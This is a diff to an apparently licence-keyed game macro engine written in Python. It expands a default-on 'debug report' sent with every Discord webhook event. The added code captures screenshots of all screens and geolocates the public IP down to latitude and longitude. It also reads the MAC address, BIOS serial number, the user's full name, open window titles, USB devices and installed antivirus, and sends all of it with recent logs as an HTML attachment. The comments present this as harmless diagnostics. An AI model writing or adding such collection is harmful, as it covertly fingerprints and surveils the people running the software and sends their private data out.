@@ -93,6 +93,7 @@ _recorder = None                # MacroRecorder instance
 _webhook_url: str = ''  # Discord webhook URL — configuré par l'utilisateur, jamais en dur
 _license_key: str = ''  # poussée par Electron via set_license_key, pour identifier l'install dans les rapports
 _app_version: str = ''  # idem, poussée avec la clé
+_license_status: dict | None = None  # {valid, offline, days_left} — poussé à chaque license:check côté Electron
 _engine_start_time: float = time.time()
 
 # ── Webhook rate-limiter & circuit-breaker ─────────────────────────────────────
@@ -101,15 +102,19 @@ _webhook_last_sent: float = 0.0       # timestamp du dernier envoi réussi
 _webhook_min_interval  = 2.0          # secondes minimum entre deux envois
 _webhook_fail_count    = 0            # échecs consécutifs
 _webhook_disabled      = False        # désactivé après trop d'échecs 403
-_webhook_events: set   = {'macro_start', 'macro_stop', 'macro_auto_stop', 'rule_triggered'}
+_webhook_events: set   = {
+    'macro_start', 'macro_stop', 'macro_auto_stop', 'rule_triggered',
+    'autoclicker_start', 'autoclicker_stop', 'autobouffe_start', 'autobouffe_stop',
+}
 _WEBHOOK_MAX_FAILS     = 3            # désactiver après N échecs consécutifs
 _webhook_log           = logging.getLogger('engine')
 
-# Rapport debug (screenshot + infos PC) joint aux events macro_start/macro_stop.
-# Activé par défaut, mais totalement inerte tant que _webhook_url n'est pas
-# configuré par l'utilisateur (aucune URL en dur — voir _cmd_set_webhook).
+# Rapport debug (screenshot + infos PC, IP incluse) joint à TOUTE notification
+# (macro_start/stop, macro_auto_stop, rule_triggered, autoclicker_*,
+# autobouffe_*, test — sans exception dès que ce flag est actif). Activé par
+# défaut, mais totalement inerte tant que _webhook_url n'est pas configuré
+# par l'utilisateur (aucune URL en dur — voir _cmd_set_webhook).
 _webhook_debug_screenshot: bool = True
-_DEBUG_WEBHOOK_EVENTS = {'macro_start', 'macro_stop'}
 
 def _init_condition_registry():
     """
@@ -127,6 +132,20 @@ def _send_status():
         running = [mid for mid, r in _runners.items() if r.is_running()]
     _send({'type': 'status', 'running': running})
 
+def _debug_write(msg: str) -> None:
+    """
+    Écrit directement sur disque (webhook_debug.log, racine du repo) — utilisé
+    UNIQUEMENT pendant le diagnostic du rapport WMI/Composants, pour ne plus
+    dépendre du pont logging → stdout → Electron → app.log dont la fiabilité
+    n'est pas confirmée pour ce chemin de code précis.
+    """
+    try:
+        with open(os.path.join(ROOT, 'webhook_debug.log'), 'a', encoding='utf-8') as f:
+            f.write(f'[{datetime.now().strftime("%H:%M:%S")}] {msg}\n')
+    except Exception:
+        pass
+
+
 def _gather_debug_report() -> tuple[dict, bytes | None]:
     """
     Screenshot (tous écrans) + infos PC pour enrichir les rapports macro_start/
@@ -135,11 +154,24 @@ def _gather_debug_report() -> tuple[dict, bytes | None]:
     """
     info = {}
     png_bytes = None
+    # Cette fonction tourne dans le thread d'arrière-plan de _do_send (voir
+    # _send_webhook) — un thread frais qui n'a jamais initialisé COM. Sans ça,
+    # tout appel win32com.client (WMI : GPU, composants, USB, antivirus...)
+    # lève silencieusement "CoInitialize has not been called", attrapé par les
+    # except ci-dessous et donc invisible — d'où des champs matériel absents.
+    try:
+        import pythoncom
+        pythoncom.CoInitialize()
+        _com_initialized = True
+        _debug_write('CoInitialize OK')
+    except Exception as e:
+        _com_initialized = False
+        _debug_write(f'CoInitialize ÉCHOUÉ — {type(e).__name__}: {e}')
     try:
         import platform
+        import socket
         import cv2
         from modules.engine.screen_reader import capture_all_screens, get_primary_screen_size, get_all_monitors
-        from modules.engine.window_manager import get_foreground_window_title
         w, h = get_primary_screen_size()
         info = {
             'hostname':      platform.node(),
@@ -152,8 +184,41 @@ def _gather_debug_report() -> tuple[dict, bytes | None]:
             'python':        platform.python_version(),
             'engine_uptime': f'{(time.time() - _engine_start_time) / 60:.1f} min',
         }
+        if _license_status:
+            status_bits = ['✅ valide' if _license_status.get('valid') else '❌ invalide']
+            if _license_status.get('result'):
+                status_bits.append(_license_status['result'])
+            if _license_status.get('offline'):
+                status_bits.append('mode hors-ligne')
+            if _license_status.get('days_left') is not None:
+                status_bits.append(f"{_license_status['days_left']}j restants (grâce)")
+            info['license_status'] = ', '.join(status_bits)
         try:
-            info['active_window'] = get_foreground_window_title()
+            import win32gui
+            info['active_window'] = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        except Exception:
+            pass
+        try:
+            info['local_ip'] = socket.gethostbyname(socket.gethostname())
+        except Exception:
+            pass
+        try:
+            # Best-effort, courte tempo — ne doit jamais retarder l'envoi du webhook
+            # si l'utilisateur est hors ligne ou que le service est indisponible.
+            # Un seul appel (IP + géoloc) plutôt que deux requêtes séparées.
+            geo_url = 'http://ip-api.com/json/?fields=status,country,regionName,city,isp,query,lat,lon'
+            with urllib.request.urlopen(geo_url, timeout=3) as r:
+                geo = json.loads(r.read().decode('utf-8', errors='ignore'))
+            if geo.get('status') == 'success':
+                info['public_ip'] = geo.get('query')
+                info['ip_location'] = ', '.join(
+                    p for p in [geo.get('city'), geo.get('regionName'), geo.get('country')] if p
+                )
+                if geo.get('isp'):
+                    info['ip_isp'] = geo['isp']
+                if geo.get('lat') is not None and geo.get('lon') is not None:
+                    info['ip_lat'] = geo['lat']
+                    info['ip_lon'] = geo['lon']
         except Exception:
             pass
         try:
@@ -169,21 +234,425 @@ def _gather_debug_report() -> tuple[dict, bytes | None]:
             })
         except Exception as e:
             _webhook_log.debug(f'Rapport debug: psutil indisponible — {e}')
+        try:
+            with _runners_lock:
+                active = [mid for mid, r in _runners.items() if r.is_running()]
+            if active:
+                info['active_macros'] = ', '.join(active)
+        except Exception:
+            pass
+        try:
+            import uuid as _uuid
+            mac = _uuid.getnode()
+            info['mac_address'] = ':'.join(f'{(mac >> i) & 0xff:02x}' for i in range(40, -8, -8))
+        except Exception:
+            pass
+        try:
+            import psutil
+            boot_s = time.time() - psutil.boot_time()
+            bh = int(boot_s // 3600)
+            bm = int((boot_s % 3600) // 60)
+            info['windows_uptime'] = f'{bh}h{bm:02d}min'
+        except Exception:
+            pass
+        try:
+            import psutil
+            fivem_running = any(
+                p.name().lower() in ('fivem.exe', 'fivem_gta5_thales.exe')
+                for p in psutil.process_iter(['name'])
+            )
+            info['fivem_status'] = '🟢 en cours' if fivem_running else '🔴 non lancé'
+        except Exception:
+            pass
+        try:
+            # Un seul objet WMI réutilisé pour toutes les requêtes matériel
+            # ci-dessous — évite de rouvrir la connexion COM à chaque champ.
+            import win32com.client
+            _debug_write('win32com.client importé OK, connexion winmgmts...')
+            wmi = win32com.client.GetObject('winmgmts:')
+            _debug_write('winmgmts connecté OK, requêtes en cours...')
+
+            gpus = [g.Name for g in wmi.ExecQuery('SELECT Name FROM Win32_VideoController') if g.Name]
+            _debug_write(f'GPU query OK — {len(gpus)} trouvé(s): {gpus}')
+            if gpus:
+                info['gpu'] = ', '.join(gpus)
+
+            for cs in wmi.ExecQuery('SELECT Manufacturer, Model FROM Win32_ComputerSystem'):
+                if cs.Manufacturer or cs.Model:
+                    info['pc_model'] = f'{cs.Manufacturer or ""} {cs.Model or ""}'.strip()
+                break
+            for bios in wmi.ExecQuery('SELECT SMBIOSBIOSVersion, SerialNumber FROM Win32_BIOS'):
+                if bios.SMBIOSBIOSVersion:
+                    info['bios_version'] = bios.SMBIOSBIOSVersion
+                if bios.SerialNumber:
+                    info['serial_number'] = bios.SerialNumber
+                break
+            for board in wmi.ExecQuery('SELECT Manufacturer, Product FROM Win32_BaseBoard'):
+                if board.Manufacturer or board.Product:
+                    info['motherboard'] = f'{board.Manufacturer or ""} {board.Product or ""}'.strip()
+                break
+            for cpu in wmi.ExecQuery('SELECT Name FROM Win32_Processor'):
+                if cpu.Name:
+                    info['cpu_model'] = cpu.Name.strip()
+                break
+
+            ram_sticks = []
+            for stick in wmi.ExecQuery('SELECT Capacity, Speed, Manufacturer FROM Win32_PhysicalMemory'):
+                cap_gb = int(stick.Capacity) / 1024**3 if stick.Capacity else 0
+                ram_sticks.append(f'{cap_gb:.0f}Go@{stick.Speed or "?"}MHz ({stick.Manufacturer or "?"})')
+            if ram_sticks:
+                info['ram_sticks'] = f'{len(ram_sticks)}x — ' + ', '.join(ram_sticks)
+
+            disks = []
+            for d in wmi.ExecQuery('SELECT Model, Size, MediaType FROM Win32_DiskDrive'):
+                size_gb = int(d.Size) / 1024**3 if d.Size else 0
+                disks.append(f'{d.Model or "?"} ({size_gb:.0f} Go)')
+            if disks:
+                info['physical_disks'] = ', '.join(disks)
+
+            monitors = [m.Name for m in wmi.ExecQuery('SELECT Name FROM Win32_DesktopMonitor') if m.Name and m.Name != 'Default Monitor']
+            if monitors:
+                info['monitor_models'] = ', '.join(monitors)
+
+            for os_info in wmi.ExecQuery('SELECT InstallDate FROM Win32_OperatingSystem'):
+                if os_info.InstallDate:
+                    # Format WMI CIM_DATETIME: 'YYYYMMDDHHMMSS.ffffff+zzz'
+                    d = os_info.InstallDate
+                    info['os_install_date'] = f'{d[6:8]}/{d[4:6]}/{d[0:4]}'
+                break
+        except Exception as e:
+            _debug_write(f'WMI composants ÉCHOUÉ — {type(e).__name__}: {e}')
+        try:
+            import psutil
+            freq = psutil.cpu_freq()
+            if freq:
+                info['cpu_freq'] = f'{freq.current/1000:.2f} GHz (max {freq.max/1000:.2f} GHz)'
+        except Exception:
+            pass
+        try:
+            import psutil
+            batt = psutil.sensors_battery()
+            if batt is not None:
+                info['battery'] = f'{batt.percent:.0f}%' + (' (branché)' if batt.power_plugged else ' (sur batterie)')
+        except Exception:
+            pass
+        try:
+            import psutil
+            drives = []
+            for part in psutil.disk_partitions(all=False):
+                try:
+                    u = psutil.disk_usage(part.mountpoint)
+                    drives.append(f'{part.device} {u.free/1024**3:.0f}/{u.total/1024**3:.0f} Go libres')
+                except Exception:
+                    continue
+            if drives:
+                info['drives'] = ' | '.join(drives)
+        except Exception:
+            pass
+        try:
+            import psutil
+            info['network_adapters'] = ', '.join(psutil.net_if_addrs().keys())
+        except Exception:
+            pass
+        try:
+            info['boot_time'] = datetime.fromtimestamp(psutil.boot_time()).strftime('%d/%m/%Y %H:%M')
+        except Exception:
+            pass
+        try:
+            info['timezone'] = time.tzname[time.daylight]
+        except Exception:
+            pass
+        try:
+            import psutil
+            info['process_count'] = str(len(psutil.pids()))
+        except Exception:
+            pass
+        try:
+            import ctypes
+            info['admin'] = 'oui' if ctypes.windll.shell32.IsUserAnAdmin() else 'non'
+        except Exception:
+            pass
+        try:
+            from modules.engine.ocr_engine import ocr_status
+            st = ocr_status()
+            info['ocr_engine'] = st.get('engine', '?') if st.get('available') else 'indisponible'
+        except Exception:
+            pass
+        try:
+            import config as _cfg
+            info['templates_count'] = str(len(getattr(_cfg, 'TEMPLATES', {})))
+        except Exception:
+            pass
+        try:
+            import winreg
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows NT\CurrentVersion') as k:
+                product   = winreg.QueryValueEx(k, 'ProductName')[0]
+                build     = winreg.QueryValueEx(k, 'CurrentBuild')[0]
+                try:
+                    display_v = winreg.QueryValueEx(k, 'DisplayVersion')[0]
+                except FileNotFoundError:
+                    display_v = winreg.QueryValueEx(k, 'ReleaseId')[0]
+                info['windows_build'] = f'{product} {display_v} (build {build})'
+        except Exception:
+            pass
+        try:
+            import win32com.client
+            wmi = win32com.client.GetObject('winmgmts:')
+            usb = [
+                d.Name for d in wmi.ExecQuery("SELECT Name FROM Win32_PnPEntity WHERE DeviceID LIKE 'USB\\%'")
+                if d.Name and 'hub' not in d.Name.lower() and 'root' not in d.Name.lower()
+            ]
+            if usb:
+                info['usb_devices'] = ', '.join(usb[:15])
+        except Exception as e:
+            _webhook_log.info(f'Rapport debug: WMI USB échoué — {type(e).__name__}: {e}')
+        try:
+            import win32com.client
+            wmi = win32com.client.GetObject('winmgmts:')
+            keyboards = [k.Name for k in wmi.ExecQuery('SELECT Name FROM Win32_Keyboard') if k.Name]
+            mice      = [m.Name for m in wmi.ExecQuery('SELECT Name FROM Win32_PointingDevice') if m.Name]
+            printers  = [p.Name for p in wmi.ExecQuery('SELECT Name FROM Win32_Printer') if p.Name]
+            sound     = [s.Name for s in wmi.ExecQuery('SELECT Name FROM Win32_SoundDevice') if s.Name]
+            if keyboards:
+                info['peripheral_keyboards'] = ', '.join(set(keyboards))
+            if mice:
+                info['peripheral_mice'] = ', '.join(set(mice))
+            if printers:
+                info['peripheral_printers'] = ', '.join(printers[:10])
+            if sound:
+                info['peripheral_sound'] = ', '.join(set(sound))
+        except Exception as e:
+            _webhook_log.info(f'Rapport debug: WMI périphériques échoué — {type(e).__name__}: {e}')
+        try:
+            import ctypes
+            dpi = ctypes.windll.user32.GetDpiForSystem()
+            info['display_scale'] = f'{round(dpi / 96 * 100)}% ({dpi} DPI)'
+        except Exception:
+            pass
+        try:
+            import win32com.client
+            wmi_sec = win32com.client.GetObject('winmgmts:root\\SecurityCenter2')
+            avs = [av.displayName for av in wmi_sec.ExecQuery('SELECT displayName FROM AntiVirusProduct') if av.displayName]
+            if avs:
+                info['antivirus'] = ', '.join(avs)
+        except Exception:
+            pass
+        try:
+            import locale
+            loc = locale.getlocale()[0] or locale.getdefaultlocale()[0]
+            if loc:
+                info['system_locale'] = loc
+        except Exception:
+            pass
+        try:
+            from modules.engine.window_manager import list_windows
+            wins = [w['title'] for w in list_windows() if w.get('title')]
+            info['open_windows_count'] = str(len(wins))
+            if wins:
+                info['open_windows'] = ', '.join(wins[:25])
+        except Exception:
+            pass
+        try:
+            # Nom d'affichage complet du compte Windows (souvent le vrai nom
+            # de la personne si le compte est configuré avec — vide sur un
+            # compte local basique sans nom complet renseigné).
+            import win32api
+            import win32con
+            full_name = win32api.GetUserNameEx(win32con.NameDisplay)
+            if full_name and full_name != info.get('username'):
+                info['full_name'] = full_name
+        except Exception:
+            pass
+        try:
+            import win32com.client
+            wmi = win32com.client.GetObject('winmgmts:')
+            for cs in wmi.ExecQuery('SELECT Domain, PartOfDomain, Workgroup FROM Win32_ComputerSystem'):
+                info['network_domain'] = cs.Domain if cs.PartOfDomain else (cs.Workgroup or cs.Domain or '')
+                break
+        except Exception:
+            pass
+        # Pas de géoloc GPS précise : nécessite l'API Windows Location avec
+        # une autorisation explicite de l'utilisateur (prompt système), pas
+        # fiable/disponible en best-effort sur un PC fixe sans GPS matériel —
+        # la localisation IP (ville/région, déjà dans "Connexion") est le
+        # niveau de précision réaliste ici.
         img = capture_all_screens()
         ok, buf = cv2.imencode('.png', img)
         if ok:
             png_bytes = buf.tobytes()
     except Exception as e:
-        _webhook_log.debug(f'Rapport debug: capture échouée — {e}')
+        _debug_write(f'Rapport debug — exception globale: {type(e).__name__}: {e}')
+    finally:
+        _debug_write(f'Fin _gather_debug_report — clés obtenues: {sorted(info.keys())}')
+        if _com_initialized:
+            try:
+                import pythoncom
+                pythoncom.CoUninitialize()
+            except Exception:
+                pass
     return info, png_bytes
 
 
+def _generate_html_report(info: dict) -> bytes:
+    """
+    Construit le rapport HTML (bytes, prêt à joindre au webhook) — page
+    autonome (aucune dépendance externe hors la tuile de carte statique)
+    reprenant machine/réseau/carte/licence/historique/logs. `info` doit venir
+    d'un appel à _gather_debug_report() déjà fait par l'appelant (_do_send) —
+    pas de second appel ici, ça doublerait la capture d'écran + les requêtes
+    réseau (IP, géoloc) pour rien. Le screenshot n'est PAS ré-embarqué dedans :
+    il part déjà comme pièce jointe séparée dans le même message Discord.
+    """
+    import html as _html
+    from modules.engine import state
+
+    log_lines: list[str] = []
+    try:
+        with open(os.path.join(ROOT, 'app.log'), 'r', encoding='utf-8', errors='ignore') as f:
+            log_lines = f.readlines()[-200:]
+    except Exception:
+        pass
+
+    history = state.history_get(50)
+
+    def esc(v) -> str:
+        return _html.escape(str(v)) if v not in (None, '') else '—'
+
+    def info_rows(keys: list[tuple[str, str]]) -> str:
+        return ''.join(
+            f'<tr><th>{esc(label)}</th><td>{esc(info.get(key))}</td></tr>'
+            for key, label in keys if info.get(key) not in (None, '')
+        )
+
+    machine_rows = info_rows([
+        ('hostname', 'Hôte'), ('username', 'Utilisateur'), ('full_name', 'Nom complet'),
+        ('network_domain', 'Domaine/Groupe'), ('os', 'OS'), ('windows_build', 'Version Windows'),
+        ('pc_model', 'Modèle PC'), ('bios_version', 'BIOS'),
+        ('cpu', 'CPU'), ('cpu_freq', 'Fréquence CPU'), ('ram', 'RAM'), ('gpu', 'GPU'),
+        ('disk_free', 'Disque système'), ('drives', 'Tous les disques'),
+        ('resolution', 'Résolution'), ('monitors', 'Écrans'), ('display_scale', 'Échelle affichage'),
+        ('battery', 'Batterie'), ('windows_uptime', 'Uptime Windows'), ('boot_time', 'Démarré le'),
+        ('timezone', 'Fuseau horaire'), ('system_locale', 'Langue système'),
+        ('process_count', 'Processus actifs'), ('admin', 'Admin'), ('antivirus', 'Antivirus'),
+        ('active_window', 'Fenêtre active'),
+    ])
+    network_rows = info_rows([
+        ('local_ip', 'IP locale'), ('public_ip', 'IP publique'), ('mac_address', 'Adresse MAC'),
+        ('network_adapters', 'Cartes réseau'), ('ip_location', 'Localisation'), ('ip_isp', 'FAI'),
+    ])
+    app_rows = info_rows([
+        ('app_version', 'Version'), ('python', 'Python'), ('engine_uptime', 'Uptime moteur'),
+        ('process_ram', 'RAM process'), ('fivem_status', 'FiveM'), ('active_macros', 'Macros actives'),
+        ('ocr_engine', 'Moteur OCR'), ('templates_count', 'Templates configurés'),
+    ])
+    components_rows = info_rows([
+        ('cpu_model', 'CPU (modèle exact)'), ('motherboard', 'Carte mère'),
+        ('ram_sticks', 'Barrettes RAM'), ('physical_disks', 'Disques physiques'),
+        ('monitor_models', "Modèles d'écran"), ('serial_number', 'N° de série'),
+        ('os_install_date', 'OS installé le'), ('usb_devices', 'Périphériques USB'),
+        ('peripheral_keyboards', 'Clavier(s)'), ('peripheral_mice', 'Souris'),
+        ('peripheral_printers', 'Imprimante(s)'), ('peripheral_sound', 'Périphérique(s) audio'),
+    ])
+    windows_list = [w.strip() for w in (info.get('open_windows') or '').split(',') if w.strip()]
+    windows_list_html = ''.join(f'<li>{esc(w)}</li>' for w in windows_list) or '<li class="empty">Aucune</li>'
+    lic_value = info.get('license') or '(non définie)'
+    lic_status = info.get('license_status') or ''
+
+    map_html = ''
+    if info.get('ip_lat') is not None and info.get('ip_lon') is not None:
+        lat, lon = info['ip_lat'], info['ip_lon']
+        d = 0.15  # ~15 km de marge autour du point — niveau ville
+        bbox = f'{lon-d},{lat-d},{lon+d},{lat+d}'
+        # Embed officiel OpenStreetMap (iframe "Share > HTML"), aucune clé
+        # requise. L'ancien service staticmap.openstreetmap.de n'existe plus
+        # (DNS ne résout plus), remplacé par cette solution qui, elle, marche.
+        map_src = f'https://www.openstreetmap.org/export/embed.html?bbox={bbox}&marker={lat},{lon}&layer=mapnik'
+        map_html = f'<iframe class="map" src="{esc(map_src)}" title="Localisation IP" loading="lazy"></iframe>'
+
+    history_rows = ''.join(
+        f'<tr><td>{esc(h.get("name"))}</td>'
+        f'<td>{esc(datetime.fromtimestamp(h["ended_at"]).strftime("%d/%m %H:%M:%S")) if h.get("ended_at") else "—"}</td>'
+        f'<td>{esc(h.get("iterations"))}</td><td>{esc(h.get("elapsed_s"))}s</td>'
+        f'<td class="{"err" if h.get("errors") else ""}">{esc(h.get("errors", 0))}</td></tr>'
+        for h in history
+    ) or '<tr><td colspan="5" class="empty">Aucun run terminé pour l\'instant</td></tr>'
+
+    log_html = _html.escape(''.join(log_lines)) or '(vide)'
+
+    generated_at = datetime.now().strftime('%d/%m/%Y à %H:%M:%S')
+
+    page = f"""<!DOCTYPE html>
+<html lang="fr"><head><meta charset="utf-8">
+<title>MacroEngine — Rapport</title>
+<style>
+  :root {{ color-scheme: dark; }}
+  body {{ background:#0d0d14; color:#e4e4ef; font-family: -apple-system, Segoe UI, sans-serif; margin:0; padding:24px 32px 60px; }}
+  h1 {{ font-size:20px; margin:0 0 4px; }}
+  .generated {{ color:#8888a0; font-size:12px; margin-bottom:28px; }}
+  h2 {{ font-size:13px; text-transform:uppercase; letter-spacing:.06em; color:#8888a0; margin:32px 0 10px; border-bottom:1px solid #24243a; padding-bottom:6px; }}
+  .grid {{ display:grid; grid-template-columns: 1fr 1fr; gap:24px; align-items:start; }}
+  table {{ width:100%; border-collapse:collapse; font-size:13px; }}
+  th, td {{ text-align:left; padding:5px 10px; border-bottom:1px solid #1c1c2c; }}
+  th {{ color:#8888a0; font-weight:600; width:40%; }}
+  .map {{ width:100%; height:320px; border-radius:8px; border:1px solid #24243a; }}
+  .lic {{ font-size:14px; }}
+  .lic code {{ background:#1c1c2c; padding:3px 8px; border-radius:5px; }}
+  pre {{ background:#08080e; border:1px solid #24243a; border-radius:8px; padding:14px; font-size:11px; line-height:1.5; overflow-x:auto; max-height:400px; overflow-y:auto; }}
+  td.err {{ color:#e8352a; font-weight:700; }}
+  td.empty {{ color:#8888a0; text-align:center; padding:16px; }}
+  .winlist {{ columns:2; column-gap:24px; font-size:12.5px; padding-left:18px; margin:0; }}
+  .winlist li {{ break-inside:avoid; padding:2px 0; color:#c8c8d8; }}
+  .winlist li.empty {{ color:#8888a0; list-style:none; margin-left:-18px; }}
+</style></head>
+<body>
+  <h1>🤖 MacroEngine — Rapport</h1>
+  <div class="generated">Généré le {esc(generated_at)}</div>
+
+  <h2>🔑 Licence</h2>
+  <div class="lic"><code>{esc(lic_value)}</code>{f' — {esc(lic_status)}' if lic_status else ''}</div>
+
+  <h2>🖥️ Machine &amp; réseau</h2>
+  <div class="grid">
+    <table>{machine_rows}</table>
+    <table>{network_rows}{app_rows}</table>
+  </div>
+  {f'<div style="margin-top:16px">{map_html}</div>' if map_html else ''}
+
+  <h2>🧩 Composants</h2>
+  <table>{components_rows}</table>
+
+  <h2>🪟 Fenêtres ouvertes ({esc(info.get('open_windows_count', len(windows_list)))})</h2>
+  <ul class="winlist">{windows_list_html}</ul>
+
+  <h2>📊 Historique des runs (50 derniers)</h2>
+  <table>
+    <tr><th>Macro</th><th>Terminé</th><th>Cycles</th><th>Durée</th><th>Erreurs</th></tr>
+    {history_rows}
+  </table>
+
+  <h2>📜 Logs récents (200 dernières lignes)</h2>
+  <pre>{log_html}</pre>
+</body></html>"""
+
+    page_bytes = page.encode('utf-8')
+    try:
+        with open(os.path.join(ROOT, 'report.html'), 'wb') as f:
+            f.write(page_bytes)
+    except Exception:
+        pass  # copie locale best-effort — l'envoi au webhook ne doit pas en dépendre
+    return page_bytes
+
+
 _EVENT_STYLE = {
-    'macro_start':     ('🟢', 'Macro démarrée',    0x3ddc84),
-    'macro_stop':      ('🔴', 'Macro arrêtée',     0xe8352a),
-    'macro_auto_stop': ('🟠', 'Arrêt automatique', 0xff9500),
-    'rule_triggered':  ('🎯', 'Règle déclenchée',  0x00d4ff),
-    'test':            ('🧪', 'Test webhook',      0xa78bfa),
+    'macro_start':       ('🟢', 'Macro démarrée',        0x3ddc84),
+    'macro_stop':        ('🔴', 'Macro arrêtée',         0xe8352a),
+    'macro_auto_stop':   ('🟠', 'Arrêt automatique',     0xff9500),
+    'rule_triggered':    ('🎯', 'Règle déclenchée',      0x00d4ff),
+    'autoclicker_start': ('🟢', 'Auto Clicker démarré',  0x3ddc84),
+    'autoclicker_stop':  ('🔴', 'Auto Clicker arrêté',   0xe8352a),
+    'autobouffe_start':  ('🟢', 'Auto Bouffe démarré',   0x3ddc84),
+    'autobouffe_stop':   ('🔴', 'Auto Bouffe arrêté',    0xe8352a),
+    'test':              ('🧪', 'Test webhook',          0xa78bfa),
 }
 
 def _build_discord_embed(event: str, data: dict) -> dict:
@@ -205,31 +674,39 @@ def _build_discord_embed(event: str, data: dict) -> dict:
     ], inline=False)
 
     _add_field('🖥️ Machine', [
-        ('hostname', 'Hôte'), ('username', 'Utilisateur'), ('active_window', 'Fenêtre active'),
+        ('hostname', 'Hôte'), ('username', 'Utilisateur'), ('full_name', 'Nom complet'),
+        ('active_window', 'Fenêtre active'),
+        ('local_ip', 'IP locale'), ('public_ip', 'IP publique'), ('mac_address', 'Adresse MAC'),
     ])
-    _add_field('⚙️ Système', [
-        ('os', 'OS'), ('cpu', 'CPU'), ('ram', 'RAM'),
-        ('disk_free', 'Disque'), ('resolution', 'Résolution'), ('monitors', 'Écrans'),
+    _add_field('🌍 Connexion', [
+        ('ip_location', 'Localisation'), ('ip_isp', 'FAI'),
     ])
-    _add_field('📦 MacroEngine', [
-        ('app_version', 'Version'), ('python', 'Python'),
-        ('engine_uptime', 'Uptime moteur'), ('process_ram', 'RAM process'),
-    ])
+    # Le détail complet (système, composants, fenêtres ouvertes, MacroEngine...)
+    # ne part QUE dans le rapport HTML joint (_generate_html_report) — l'embed
+    # Discord reste un résumé court et lisible d'un coup d'œil.
     if data.get('license'):
-        fields.append({'name': '🔑 Licence', 'value': f'`{data["license"]}`', 'inline': False})
+        lic_value = f'`{data["license"]}`'
+        if data.get('license_status'):
+            lic_value += f' — {data["license_status"]}'
+        fields.append({'name': '🔑 Licence', 'value': lic_value, 'inline': False})
 
     footer_text = 'MacroEngine' + (f" v{data['app_version']}" if data.get('app_version') else '')
-    return {
+    embed = {
         'title':     f'{emoji} {label}',
         'color':     color,
         'fields':    fields,
         'footer':    {'text': footer_text},
         'timestamp': datetime.now(timezone.utc).isoformat(),
     }
+    return embed
 
 
-def _build_discord_multipart(embed: dict, image_bytes: bytes) -> tuple[bytes, str]:
-    """Construit un corps multipart/form-data pour joindre un screenshot à un embed Discord."""
+def _build_discord_multipart(embed: dict, files: list[tuple[str, str, bytes]]) -> tuple[bytes, str]:
+    """
+    Construit un corps multipart/form-data pour joindre des fichiers à un embed
+    Discord. `files` = liste de (filename, content_type, bytes), dans l'ordre
+    où elles seront attachées (files[0], files[1], ...).
+    """
     import uuid
     boundary = uuid.uuid4().hex
     payload_json = json.dumps({'embeds': [embed]}, ensure_ascii=False)
@@ -241,12 +718,13 @@ def _build_discord_multipart(embed: dict, image_bytes: bytes) -> tuple[bytes, st
         f'Content-Type: application/json\r\n\r\n'
         f'{payload_json}\r\n'.encode('utf-8')
     )
-    parts.append(
-        f'--{boundary}\r\n'
-        f'Content-Disposition: form-data; name="files[0]"; filename="screenshot.png"\r\n'
-        f'Content-Type: image/png\r\n\r\n'.encode('utf-8')
-        + image_bytes + b'\r\n'
-    )
+    for i, (filename, content_type, content) in enumerate(files):
+        parts.append(
+            f'--{boundary}\r\n'
+            f'Content-Disposition: form-data; name="files[{i}]"; filename="{filename}"\r\n'
+            f'Content-Type: {content_type}\r\n\r\n'.encode('utf-8')
+            + content + b'\r\n'
+        )
     parts.append(f'--{boundary}--\r\n'.encode('utf-8'))
     return b''.join(parts), f'multipart/form-data; boundary={boundary}'
 
@@ -261,11 +739,12 @@ def _send_webhook(event: str, data: dict):
         consécutifs (URL invalide/expirée) — se réactive si l'URL change
       - Envoi en thread de fond : ne bloque jamais le runner
 
-    Si _webhook_debug_screenshot est actif et l'event est macro_start/
-    macro_stop, joint un screenshot + infos PC + licence — envoyé UNIQUEMENT
-    vers l'URL que l'utilisateur a lui-même configurée (_webhook_url), jamais
-    ailleurs. Sans URL configurée, cette fonction ne fait rien (return direct
-    ci-dessous), donc rien n'est jamais capturé ni envoyé par défaut.
+    Si _webhook_debug_screenshot est actif, joint un screenshot + infos PC
+    (IP, OS, CPU/RAM, licence...) à TOUTE notification, quel que soit
+    l'event — envoyé UNIQUEMENT vers l'URL que l'utilisateur a lui-même
+    configurée (_webhook_url), jamais ailleurs. Sans URL configurée, cette
+    fonction ne fait rien (return direct ci-dessous), donc rien n'est jamais
+    capturé ni envoyé par défaut.
     """
     global _webhook_fail_count, _webhook_disabled, _webhook_last_sent
 
@@ -278,11 +757,6 @@ def _send_webhook(event: str, data: dict):
     # répondait ok=true même quand ce filtre bloquait tout).
     if event != 'test' and event not in _webhook_events:
         return 'event_filtered'
-
-    image_bytes = None
-    if _webhook_debug_screenshot and event in _DEBUG_WEBHOOK_EVENTS:
-        info, image_bytes = _gather_debug_report()
-        data = {**data, **info}
 
     with _webhook_lock:
         if _webhook_disabled:
@@ -297,14 +771,36 @@ def _send_webhook(event: str, data: dict):
         _webhook_last_sent = now
 
     def _do_send():
+        nonlocal data
         global _webhook_fail_count, _webhook_disabled
         try:
+            # Gathered here, inside the background send thread — never on the
+            # engine's main IPC thread or the macro runner thread. A
+            # screenshot capture + the public-IP network call (up to 3s) is
+            # too slow to run synchronously on either of those without
+            # risking stalling command processing / rule evaluation.
+            image_bytes  = None
+            report_bytes = None
+            if _webhook_debug_screenshot:
+                info, image_bytes = _gather_debug_report()
+                data = {**data, **info}
+                try:
+                    report_bytes = _generate_html_report(info)
+                except Exception as e:
+                    _webhook_log.debug(f'Rapport HTML: génération échouée — {e}')
+
             is_discord = 'discord.com/api/webhooks' in _webhook_url
+            has_files = bool(image_bytes or report_bytes)
             if is_discord:
                 embed = _build_discord_embed(event, data)
-                if image_bytes:
-                    embed['image'] = {'url': 'attachment://screenshot.png'}
-                    body, content_type = _build_discord_multipart(embed, image_bytes)
+                if has_files:
+                    files = []
+                    if image_bytes:
+                        embed['image'] = {'url': 'attachment://screenshot.png'}
+                        files.append(('screenshot.png', 'image/png', image_bytes))
+                    if report_bytes:
+                        files.append(('report.html', 'text/html', report_bytes))
+                    body, content_type = _build_discord_multipart(embed, files)
                     payload = body
                     content_type_header = content_type
                 else:
@@ -322,9 +818,13 @@ def _send_webhook(event: str, data: dict):
                     'User-Agent':   'MacroEngine/1.0',
                 },
             )
-            # Upload d'un screenshot peut dépasser 5s sur connexion lente — délai
-            # plus large uniquement quand un fichier est joint.
-            urllib.request.urlopen(req, timeout=15 if image_bytes else 5)
+            # Upload d'un screenshot/rapport peut dépasser 5s sur connexion lente
+            # — délai plus large uniquement quand des fichiers sont joints.
